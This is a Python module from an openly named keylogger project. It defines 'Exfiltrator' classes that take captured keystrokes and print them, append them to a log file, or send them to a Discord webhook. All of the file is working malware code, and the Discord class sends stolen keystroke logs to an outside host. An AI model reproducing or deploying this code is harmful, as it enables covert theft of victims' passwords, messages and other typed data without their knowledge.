#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import aiohttp
import asyncio
import logging
from pathlib import Path

from discord import Webhook, AsyncWebhookAdapter

import reporting
from keylogger import KeyLogger


class Exfiltrator(abc.ABC):
    def __init__(self, keylogger: KeyLogger, tag: str):
        self.keylogger = keylogger
        self.keylogger.register_exfiltrator(exfiltrator=self)
        self.tag = tag
        self.logger = reporting.set_logger(name=self.tag)

    @property
    def tag(self) -> str:
        return self._tag

    @tag.setter
    def tag(self, tag_name: str) -> None:
        self._tag = f"{self.keylogger.__class__.__name__}::" \
                    f"{self.__class__.__name__}"
        if tag_name is not None:
            self._tag += f"::{tag_name}"

    @property
    def data(self):
        return str(self.keylogger)

    @abc.abstractmethod
    def update(self, *args, **kwargs):
        ...


class Screen(Exfiltrator):
    def __init__(self, *, keylogger: KeyLogger, tag: str = None):
        super().__init__(keylogger, tag)

    def update(self):
        self.logger.info(self.data if len(self.data) > 0 else "<NO INPUT>")
        print(reporting.get_logs())


class TextFile(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 file_path: [str, Path]):
        super().__init__(keylogger, tag)
        self.file_path = file_path

    def update(self):
        if len(self.data) > 0:
            self.logger.info(self.data)
            with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                file.write(reporting.get_logs())


class Discord(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 webhook_url: str):
        super().__init__(keylogger, tag)
        self.webhook_url = webhook_url
        # Prevent asyncio and webhook from spamming the logs
        for logger in "asyncio", "discord.webhook":
            logging.getLogger(logger).setLevel(logging.CRITICAL)

    def update(self) -> None:
        if len(self.data) > 0:
            self.logger.info(self.data)
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            await webhook.send(content=reporting.get_logs(), username=self.tag)
